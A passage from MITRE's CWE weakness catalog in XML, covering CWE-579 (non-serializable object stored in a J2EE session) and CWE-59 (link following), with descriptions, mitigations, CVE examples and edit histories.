               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2011-03-29">Access Control Bypass Through User-Controlled SQL Primary Key</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="579" Name="J2EE Bad Practices: Non-serializable Object Stored in Session" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product stores a non-serializable object as an HttpSession attribute, which can hurt reliability.</Description>
         <Extended_Description>A J2EE application can make use of multiple JVMs in order to improve application reliability and performance. In order to make the multiple JVMs appear as a single application to the end user, the J2EE container can replicate an HttpSession object across multiple JVMs so that if one JVM becomes unavailable another can step in and take its place without disrupting the flow of the application. This is only possible if all session data is serializable, allowing the session to be duplicated between the JVMs.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Quality Degradation</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>In order for session replication to work, the values the product stores as attributes in the session must implement the Serializable interface.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following class adds itself to the session, but because it is not serializable, the session can no longer be replicated.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class DataGlob {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>String globName;<xhtml:br/>String globValue;<xhtml:br/>
                           <xhtml:br/>public void addToSession(HttpSession session) {<xhtml:div style="margin-left:1em;">session.setAttribute("glob", this);</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP1</Entry_ID>
               <Entry_Name>Glitch in computation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2006-12-15</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="59" Name="Improper Link Resolution Before File Access ('Link Following')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Operating_System Class="Windows" Prevalence="Sometimes"/>
            <Operating_System Class="Unix" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Soft links are a UNIX term that is synonymous with simple shortcuts on Windows-based platforms.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>insecure temporary file</Term>
               <Description>Some people use the phrase "insecure temporary file" when referring to a link following weakness, but other weaknesses can produce insecure temporary files without any symlink involvement at all.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Zip Slip</Term>
               <Description>"Zip slip" is an attack that uses file archives (e.g., ZIP, tar, rar, etc.) that contain filenames with path traversal sequences that cause the files to be written outside of the directory under which the archive is expected to be extracted [REF-1282]. It is most commonly used for relative path traversal (CWE-23) and link following (CWE-59).</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism then an attacker may be able to bypass the mechanism.</Note>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Windows simple shortcuts, sometimes referred to as soft links, can be exploited remotely since a ".LNK" file can be uploaded like a normal file. This can enable remote execution.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-48.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Follow the principle of least privilege when assigning access rights to entities in a software system.</xhtml:p>
                  <xhtml:p>Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-1386</Reference>
               <Description>Some versions of Perl follow symbolic links when running with the -e option, which allows local users to overwrite arbitrary files via a symlink attack.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1386</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-1178</Reference>
               <Description>Text editor follows symbolic links when creating a rescue copy during an abnormal exit, which allows local users to overwrite the files of other users.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-1178</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0217</Reference>
               <Description>Antivirus update allows local users to create or append to arbitrary files via a symlink attack on a logfile.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0217</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0517</Reference>
               <Description>Symlink attack allows local users to overwrite files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0517</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0689</Reference>
               <Description>Window manager does not properly handle when certain symbolic links point to "stale" locations, which could allow local users to create or truncate arbitrary files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0689</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1879</Reference>
               <Description>Second-order symlink vulnerabilities</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1879</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1880</Reference>
               <Description>Second-order symlink vulnerabilities</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1880</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1916</Reference>
               <Description>Symlink in Python program</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1916</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0972</Reference>
               <Description>Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0824</Reference>
               <Description>Signal causes a dump that follows symlinks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0824</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1494</Reference>
               <Description>Hard link attack, file overwrite; interesting because program checks against soft links</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1494</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0793</Reference>
               <Description>Hard link and possibly symbolic link following vulnerabilities in embedded operating system allow local users to overwrite arbitrary files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0793</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0578</Reference>
               <Description>Server creates hard links and unlinks files as root, which allows local users to gain privileges by deleting and overwriting arbitrary files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0578</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0783</Reference>
               <Description>Operating system allows local users to conduct a denial of service by creating a hard link from a device special file to a file on an NFS file system.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0783</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1603</Reference>
               <Description>Web hosting manager follows hard links, which allows local users to read or modify arbitrary files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1603</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1901</Reference>
               <Description>Package listing system allows local users to overwrite arbitrary files via a hard link attack on the lockfiles.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1901</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1111</Reference>
               <Description>Hard link race condition</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1111</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0342</Reference>
               <Description>Mail client allows remote attackers to bypass the user warning for executable attachments such as .exe, .com, and .bat by using a .lnk file that refers to the attachment, aka "Stealth Attachment."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0342</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1042</Reference>
               <Description>FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1042</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1043</Reference>
               <Description>FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1043</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0587</Reference>
               <Description>Browser allows remote malicious web sites to overwrite arbitrary files by tricking the user into downloading a .LNK (link) file twice, which overwrites the file that was referenced in the first .LNK file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0587</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1386</Reference>
               <Description>".LNK." - .LNK with trailing dot</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1386</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1233</Reference>
               <Description>Rootkits can bypass file access restrictions to Windows kernel directories using NtCreateSymbolicLinkObject function to create symbolic link</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1233</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0725</Reference>
               <Description>File system allows local attackers to hide file usage activities via a hard link to the target file, which causes the link to be recorded in the audit trail instead of the target file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0725</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0844</Reference>
               <Description>Web server plugin allows local users to overwrite arbitrary files via a symlink attack on predictable temporary filenames.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0844</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-3629</Reference>
               <Description>A Libcontainer used in Docker Engine allows local users to escape containerization and write to an arbitrary file on the host system via a symlink attack in an image when respawning a container.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2015-3629</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21272</Reference>
               <Description>"Zip Slip" vulnerability in Go-based Open Container Initiative (OCI) registries product allows writing arbitrary files outside intended directory via symbolic links or hard links in a gzipped tarball.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21272</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-27833</Reference>
               <Description>"Zip Slip" vulnerability in container management product allows writing arbitrary files outside intended directory via a container image (.tar format) with filenames that are symbolic links that point to other files within the same tar file; however, the files being pointed to can also be symbolic links to destinations outside the intended directory, bypassing the initial check.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-27833</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>File Processing</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Link Following</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO02-C</Entry_ID>
               <Entry_Name>Canonicalize path names originating from untrusted sources</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>POS01-C</Entry_ID>
               <Entry_Name>Check for the existence of links when dealing with files</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>FIO01-PL</Entry_ID>
               <Entry_Name>Do not operate on files that can be modified by untrusted users</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP18</Entry_ID>
               <Entry_Name>Link in resource name resolution</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="132"/>
            <Related_Attack_Pattern CAPEC_ID="17"/>
            <Related_Attack_Pattern CAPEC_ID="35"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Symbolic Link Attacks&#34;, Page 518"/>
            <Reference External_Reference_ID="REF-1282"/>
         </References>
         <Notes>
            <Note Type="Theoretical">
               <xhtml:p>Link following vulnerabilities are Multi-factor Vulnerabilities (MFV). They are the combination of multiple elements: file or directory permissions, filename predictability, race conditions, and in some cases, a design limitation in which there is no mechanism for performing atomic file creation operations.</xhtml:p>
               <xhtml:p>Some potential factors are race conditions, permissions, and predictability.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Background_Details, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Applicable_Platforms, Causal_Nature, Common_Consequences, Functional_Areas, Likelihood_of_Exploit, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Background_Details, Observed_Examples, References, Relationship_Notes, Theoretical_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Link Following</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Resolve Links Before File Access (aka 'Link Following')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
